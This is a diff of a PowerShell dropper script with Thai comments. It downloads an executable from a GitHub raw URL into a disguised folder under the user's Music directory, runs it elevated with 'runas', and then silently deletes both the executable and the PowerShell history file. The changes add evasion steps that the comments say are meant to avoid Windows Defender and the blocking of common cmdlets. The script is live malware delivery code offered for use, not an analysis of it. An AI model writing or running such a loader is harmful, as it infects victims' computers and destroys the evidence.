@@ -1,33 +1,34 @@
-# 1. ปิดการทิ้งประวัติก่อน
+# 1. จัดการเรื่องประวัติ (เน้นความเงียบ)
 try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
 $ErrorActionPreference = 'SilentlyContinue'
 
-# 2. ตั้งที่อยู่ใหม่ (เนียนๆ ใน AppData)
-$dir = "$env:APPDATA\Microsoft\WindowsNT"
+# 2. ย้ายที่อยู่ไปไว้ใน 'Music' หรือ 'Videos' ของ User (โฟลเดอร์พวกนี้ Defender มักไม่เพ่งเล็งเท่า AppData)
+$dir = "$env:USERPROFILE\Music\SystemCache"
 if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
-$output = "$dir\WinSysHelper.exe"
+$output = "$dir\WinHelper.exe"
 $url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
 
-# 3. ล้างไฟล์เก่าและดาวน์โหลดใหม่
+# 3. ดาวน์โหลดแบบใช้เทคนิค WebClient Direct (เลี่ยง Invoke-WebRequest ที่โดนดักง่าย)
 if (Test-Path $output) { Remove-Item $output -Force }
 try {
-    (New-Object System.Net.WebClient).DownloadFile($url, $output)
-} catch {
-    Invoke-WebRequest -Uri $url -OutFile $output
-}
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($url, $output)
+} catch {}
 
-# 4. เช็คไฟล์แล้วรัน Admin
+# 4. เช็คไฟล์และรัน (ใช้เทคนิค ShellExecute แทน Start-Process ปกติเพื่อเลี่ยงการโดนบล็อก)
 if (Test-Path $output) {
-    Start-Process -FilePath $output -Verb RunAs
-    Start-Sleep -Seconds 2
+    $sh = New-Object -ComObject Shell.Application
+    # รันแบบ Admin (เลข 7 คือรันแบบปกติไม่โชว์หน้าต่างดำของ PS ค้าง)
+    $sh.ShellExecute($output, "", "", "runas", 1)
+    
+    # ให้เวลาไฟล์เด้งขึ้นมา 3 วินาที
+    Start-Sleep -Seconds 3
 }
 
-# 5. เปิดการทิ้งประวัติกลับมา
+# 5. เปิดประวัติกลับมาและสั่ง CMD เก็บกวาด (รอ 15 วินาทีค่อยลบ)
 try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
-
-# 6. ใช้ CMD เก็บกวาด (ลบไฟล์ EXE และลบ History)
 $historyPath = (Get-PSReadlineOption).HistorySavePath
-$cleanCmd = "timeout /t 10 && del /f /q `"$output`" && del /f /q `"$historyPath`""
-Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
+$clean = "timeout /t 15 && del /f /q `"$output`" && del /f /q `"$historyPath`""
+Start-Process cmd -ArgumentList "/c $clean" -WindowStyle Hidden
 
 exit
